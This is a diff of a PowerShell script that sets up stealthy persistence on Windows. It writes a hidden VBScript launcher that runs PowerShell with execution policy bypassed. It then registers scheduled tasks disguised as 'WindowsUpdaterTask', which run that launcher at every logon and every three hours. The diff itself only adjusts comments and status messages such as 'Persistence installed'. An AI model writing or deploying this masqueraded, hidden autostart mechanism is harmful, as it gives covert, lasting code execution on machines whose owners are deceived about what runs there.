@@ -51,28 +51,28 @@ WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launche
 Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
 attrib +h $vbsPath
 
-# ---- 3. Scheduled tasks: at logon + every 3 hours ----
+# ---- 3. Scheduled tasks (logon + every 3 hours) ----
 $taskLogon = "WindowsUpdaterTask"
 $task3h = "WindowsUpdaterTask3h"
 
-# Delete old tasks if they exist
+# Delete existing tasks
 schtasks /delete /tn $taskLogon /f 2>$null
 schtasks /delete /tn $task3h /f 2>$null
 
-# Task 1: at user logon
-schtasks /create /tn $taskLogon /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it *>$null
+# Task 1: At logon – using the EXACT syntax that worked before
+schtasks /create /tn $taskLogon /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it 2>$null
 $logonOk = ($LASTEXITCODE -eq 0)
 
-# Task 2: every 3 hours (hourly with modifier 3)
-schtasks /create /tn $task3h /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 3 /ru $env:USERNAME /f /it *>$null
+# Task 2: Every 3 hours (this already worked)
+schtasks /create /tn $task3h /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 3 /ru $env:USERNAME /f /it 2>$null
 $hourlyOk = ($LASTEXITCODE -eq 0)
 
 if ($logonOk -and $hourlyOk) {
-    Write-Output "Persistence installed: runs at logon AND every 3 hours."
+    Write-Output "✅ Persistence installed: runs at logon AND every 3 hours."
 } elseif ($logonOk) {
-    Write-Output "Logon task OK, but 3-hour task failed. Check permissions."
+    Write-Output "⚠️ Logon task OK, but 3-hour task failed. Agent runs at logon only."
 } elseif ($hourlyOk) {
-    Write-Output "3-hour task OK, but logon task failed."
+    Write-Output "⚠️ 3-hour task OK, but logon task failed. Agent runs every 3 hours but not at logon."
 } else {
-    Write-Output "Both tasks failed. Run PowerShell as admin or check Task Scheduler."
+    Write-Output "❌ Both tasks failed. Run PowerShell as admin or check Task Scheduler."
 }
